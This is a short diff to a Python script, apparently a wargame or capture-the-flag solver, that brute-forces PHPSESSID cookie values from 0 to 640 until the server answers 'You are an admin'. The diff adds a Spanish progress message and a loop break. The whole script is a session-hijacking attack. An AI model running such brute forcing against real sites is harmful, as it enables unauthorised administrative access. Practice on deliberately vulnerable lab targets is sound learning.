@@ -13,6 +13,8 @@ if __name__ == '__main__':
     session = start_session(username,password,url)
     payload = {'debug':'True','username':'admin','password':'admin'}
     for i in range(0,641):
+        print(f'intentando con {i}')
         r=session.post(url,auth=(username,password),data=payload,cookies={'PHPSESSID':str(i)})
         if 'You are an admin' in r.content.decode():
             print(r.content)
+            break
